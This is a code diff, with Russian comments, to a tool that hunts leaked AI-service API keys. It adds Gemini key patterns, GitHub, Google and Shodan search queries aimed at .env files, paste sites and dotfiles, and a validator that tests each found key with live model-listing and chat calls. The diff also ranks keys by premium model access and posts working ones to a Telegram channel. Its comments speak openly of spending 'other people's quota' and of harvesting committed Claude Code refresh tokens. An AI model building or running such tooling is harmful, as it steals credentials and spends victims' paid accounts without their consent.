@@ -120,6 +120,14 @@ DEFAULT_CONFIG = {
         'site:pastebin.com "sk-ant"',
         'site:github.com "sk-ant-api03" ".env"',
         'site:gist.github.com "sk-ant-api03"',
+        '"AIzaSy" "generativelanguage"',
+        '"AQ.Ab8" gemini',
+        '"AQ.Ab8" api key',
+        '"gemini-4-argon" key',
+        'site:rentry.co "AIza"',
+        'site:telegra.ph "AIza"',
+        'site:pastebin.com "AIzaSy"',
+        'site:gist.github.com "AIzaSy"',
     ],
     "grep_queries": [
         "api.deepseek.com sk-",
@@ -813,6 +821,9 @@ KEY_PATTERNS = [
         False,
     ),
     ("google", r"AIza[0-9A-Za-z_\-]{35}", [], False),
+    # Gemini API v2-токены (AQ.Ab8...): generativelanguage принимает их как
+    # обычный ?key= — проверено боем 2026-10: /v1beta/models отдаёт 200
+    ("google-aq", r"AQ\.Ab8[0-9A-Za-z_\-]{20,}", [], False),
     ("logfare", r"lfu_[A-Za-z0-9_\-]{15,}", ["https://logfare.ai/v1"], False),
     # voyage: pa- с ДЕФИСОМ (реальный формат). Старый pa_ ловил норвежские
     # doc-слаги ("pa_en_tabell_-_649") — 0 рабочих за всё время.
@@ -2137,6 +2148,11 @@ class GitHubCode(Source):
             'path:.env "openrouter"',
             '"sk-or-v1-" path:.env',
             '"AIza" path:.env',
+            '"AIzaSy" extension:py',
+            '"AIzaSy" extension:js',
+            '"AQ.Ab8"',
+            '"GEMINI_API_KEY" path:.env',
+            '"generativelanguage" "AIzaSy" NOT path:README',
             '"xai-" path:.env',
             '"hf_" path:.env',
             '"sk-live-" api',
@@ -2212,6 +2228,8 @@ class GitHubCode(Source):
             '"AIML_API_KEY"',
             '"AIMLAPI_KEY"',
             '"AIzaSy" extension:env',
+            '"AQ.Ab8" extension:env',
+            '"AQ.Ab8" gemini',
             # НЕОРДИНАРНО: dotfiles с живыми Claude Code кредами
             # ~/.claude/.credentials.json содержит refreshToken (минтит свежий
             # oat01 = полный Max-аккаунт) — люди коммитят в dotfiles-репо
@@ -3598,6 +3616,7 @@ class Shodan(Source):
         ('http.html:"deepseek.com"', 2),  # 39
         ('http.html:"siliconflow"', 2),  # 38
         ('http.html:"AIzaSy"', 2),  # 20 (точнее AIza)
+        ('http.html:"AQ.Ab8"', 2),  # gemini v2-токены
         # антропик-фокус: claude-code конфиги + opus/sonnet референсы
         ('http.html:"claude-code"', 5),  # 3112 — claude code конфиги с ключами
         ('http.html:"x-api-key"', 5),  # 5821 — страницы с api-key заголовками
@@ -9805,9 +9824,13 @@ def _origin_bucket(origin):
 STAR_RE = re.compile(
     r"(opus-4-[5-9]|opus-4\.[5-9]|opus-5|fable|sonnet-5|sonnet-4|gpt-5\.[4-6]|gpt-5|gpt-4o|o1-preview|"
     r"glm-5\.[23]|deepseek-v4|deepseek-v3|kimi-k3|kimi-k2\.[5-9]|minimax-m3|minimax-m2|qwen-?3\.8|"
-    r"gemini-3|grok-4\.[2-9]|grok-4|nemotron-3|mimo-v2|deepseek-r2|muse-spark|muse-glimmer|"
+    r"gemini-3|gemini-4|gemini-2\.5-pro|deep-research|antigravity|grok-4\.[2-9]|grok-4|nemotron-3|mimo-v2|deepseek-r2|muse-spark|muse-glimmer|"
     r"mistral-large|command-r|llama-4|claude-4)",
     re.I,
+)
+# ЖИРНЫЕ google-модели: постить в TG listed_only имеет смысл только с ними
+GOOGLE_FAT_RE = re.compile(
+    r"(gemini-4|gemini-3-pro|gemini-3\.[0-9]+-pro|deep-research-max)", re.I
 )
 FAT_TIER_RE = re.compile(
     r"(MAX_20x|MAX_5x|\bMAX\b|\bPRO\b|\bTEAM\b|ENTERPRISE|CORP|COPILOT|Baseten|CODEX|Plus|MISTRAL|COHERE|GROQ|XAI|TOGETHER|FIREWORKS|NVIDIA|CEREBRAS|CURSOR|WINDSURF)",
@@ -10502,6 +10525,17 @@ def validate_google(key):
             return None
         if r.status_code == 400 and "API key not valid" in r.text:
             return None  # недействителен (точный вердикт Google)
+        if r.status_code == 400:
+            # транзиентный 400 без маркера смерти у Google случается на
+            # прокси-егрессе (поймано боем 2026-10: AQ-ключ 400→200 ретраем)
+            try:
+                r = http("GET", base + "/models?key=" + key, timeout=(10, 25))
+            except Exception:
+                r = None
+            if r is None:
+                return None
+            if r.status_code == 400 and "API key not valid" in r.text:
+                return None
         if r.status_code in (403,):
             # АУДИТ-фикс: 403 ≠ недействителен. Это и "API не включена на проекте",
             # и referrer/IP-restriction — ключ ВАЛИДЕН, просто ограничен.
@@ -10548,20 +10582,20 @@ def validate_google(key):
             return None
         models = [m.get("name", "").split("/")[-1] for m in r.json().get("models", [])]
         stars = sorted({m for m in models if STAR_RE.search(m)})
-        # чат-проба крупной моделью
-        test_model = None
+        # чат-проба: жирные модели первыми (GOOGLE_FAT → STAR → бесплатные
+        # flash), максимум 4 попытки — экономим и время, и чужую квоту
+        fats = sorted({m for m in models if GOOGLE_FAT_RE.search(m)})
+        cands = fats + [m for m in stars if m not in fats]
         for pref in (
-            "gemini-3-pro",
-            "gemini-2.5-pro",
-            "gemini-3-flash",
             "gemini-2.5-flash",
+            "gemini-flash-lite-latest",
             "gemini-2.0-flash",
         ):
-            if pref in models:
-                test_model = pref
-                break
+            if pref in models and pref not in cands:
+                cands.append(pref)
         working = []
-        if test_model:
+        billing_capped = False
+        for test_model in cands[:4]:
             try:
                 r2 = http(
                     "POST",
@@ -10571,11 +10605,21 @@ def validate_google(key):
                 )
                 if r2 is not None and r2.status_code == 200:
                     working = [test_model]
+                    break
+                if (
+                    r2 is not None
+                    and r2.status_code == 429
+                    and "spending cap" in (r2.text or "")
+                ):
+                    billing_capped = True
             except Exception:
                 pass
         status = "working" if working else ("listed_only" if models else None)
         if status is None:
             return None
+        note = None
+        if billing_capped and not working:
+            note = "billing cap: жир листится, генерация закрыта капом трат"
         return {
             "key": key,
             "base": base,
@@ -10592,6 +10636,7 @@ def validate_google(key):
             "embed": None,
             "rerank": None,
             "status": status,
+            "note": note,
         }
     except Exception:
         return None
@@ -15020,7 +15065,7 @@ def validate(key, base_hint, tag, origin):
         return validate_notion(key)
     if tag == "sendgrid":
         return validate_sendgrid(key)
-    if tag == "google":
+    if tag in ("google", "google-aq"):
         return validate_google(key)
     if tag == "codex":
         return validate_codex(key)
@@ -15786,6 +15831,13 @@ def render_report(v, redact=False):
         ]
         if v.get("tier"):
             lines.append("📊 Тир: %s" % v["tier"])
+        if tag in ("google", "google-aq"):
+            sw = v.get("stars_working") or []
+            sl = v.get("stars_listed") or []
+            if sw:
+                lines.append("✅ Работает (chat-проба): ⭐ " + ", ⭐ ".join(sw))
+            if sl:
+                lines.append("🧩 Модели: " + ", ".join(sl[:12]))
         if v.get("origin"):
             lines.append("📍 Источник: %s" % str(v["origin"])[:120])
         if v.get("note"):
@@ -16048,6 +16100,7 @@ def post_finding_now(v, post=True):
             "baseten",
             "codex",
             "google",
+            "google-aq",
             "replicate",
             "mistral",
             "cohere",
@@ -16095,6 +16148,21 @@ def post_finding_now(v, post=True):
             log("  🔕 пропущен постинг: %s — не LLM-выгода (блок-лист)" % v.get("tag"))
             v["_tg_posted"] = True
             return False
+        # 2026-10-16: google-гейт. AIza/AQ-ключи с паблик-индексов живут минуты
+        # и почти всегда мертвы/рестриктед/в капе — «ЛИД» по ним засыпал чат
+        # (уведомления шли чаще находок). В чат: рабочая генерация ИЛИ
+        # listed_only с жирной моделью в списке (gemini-4/3.x-pro/
+        # deep-research-max). 403/кап без жира — только в стор.
+        if v.get("tag") in ("google", "google-aq") and status != "working":
+            if not any(
+                GOOGLE_FAT_RE.search(m) for m in (v.get("stars_listed") or [])
+            ):
+                log(
+                    "  🔕 пропущен постинг: %s %s без жирной модели — в стор"
+                    % (v.get("tag"), status)
+                )
+                v["_tg_posted"] = True
+                return False
         # quota-fresh правило: MAX с выжженным окном квоты — в стор, не в чат.
         # окно обнуляется за ~5ч, но «победой» с нулевым остатком не спамим
         quota_burned = "выжжено" in str(v.get("tier") or "") or "выжжено" in str(
@@ -17104,16 +17172,14 @@ def evolve_strategies():
 
 
 def evolve_flush_digest():
-    """Один TG-дайджест всех форматов, выученных за цикл (вместо спама)."""
+    """Раньше: TG-дайджест выученных форматов. 2026-10-16: заглушено по
+    решению игрока — «выученные» env-имена (WHISPER_API_KEY и ко) спамили
+    чат чаще находок и не давали ценности. Буфер просто чистим, в лог."""
     global _EVOLVE_CYCLE_BUFFER
     try:
         if _EVOLVE_CYCLE_BUFFER:
             uniq = list(dict.fromkeys(_EVOLVE_CYCLE_BUFFER))
-            post_telegram(
-                "🧬 Выучено за цикл: %d новых форматов: %s\n"
-                "Запросы добавлены в охват."
-                % (len(uniq), ", ".join(uniq[:10]) + ("..." if len(uniq) > 10 else ""))
-            )
+            log("  🧬 (в лог, не в TG) выучено форматов: %d" % len(uniq))
         _EVOLVE_CYCLE_BUFFER = []
     except Exception:
         pass
@@ -17121,9 +17187,9 @@ def evolve_flush_digest():
 
 def evolved_queries_for_rotation(n=4):
     """Свежайшие эволюционные запросы -> в батч github-code.
-    LOOT-TRIAGE: слот получают только живые (hits>0) или неиспытанные
-    (runs < RUNS_MAX); 0-хитовые зомби выносятся дворником, а не жрут
-    слоты вечно. runs++ за каждый выданный слот — счётчик испытаний."""
+    2026-10-16: эволюция запросов ВЫКЛЮЧЕНА по решению игрока — выученные
+    env-имена плодили шум без находок. Слоты ротации не тратим."""
+    return []
     try:
         with _EVOLVED_LOCK:
             ev = _evolved_load()
@@ -17156,9 +17222,10 @@ def evolved_query_hit(query, n_items):
                     first = not info.get("notified")
                     info["notified"] = True
                     if first:
-                        post_telegram(
-                            "🧬 ЭВОЛЮЦИЯ СРАБОТАЛА: %s -> %d файлов найдено. "
-                            "Закрепляю в горячей ротации." % (var, n_items)
+                        # 2026-10-16: без TG-спама эволюции — только лог
+                        log(
+                            "  🧬 эволюция сработала: %s -> %d файлов"
+                            % (var, n_items)
                         )
                     _evolved_save()
                     return
@@ -18802,6 +18869,7 @@ def run_once(extra_paths=(), post=True):
                 "openai-svcacct": 1,
                 "openrouter": 1,
                 "google": 1,
+                "google-aq": 1,
                 "groq": 1,
                 "xai": 1,
                 "mistral": 1,
@@ -19296,6 +19364,7 @@ NON_LLM_TAGS = {
     "anthropic-admin",
     "codex",
     "google",
+    "google-aq",
     "replicate",
     "supabase",
     # аудит-волна 2: у этих свои валидаторы, chat-проба recheck'а — чистый
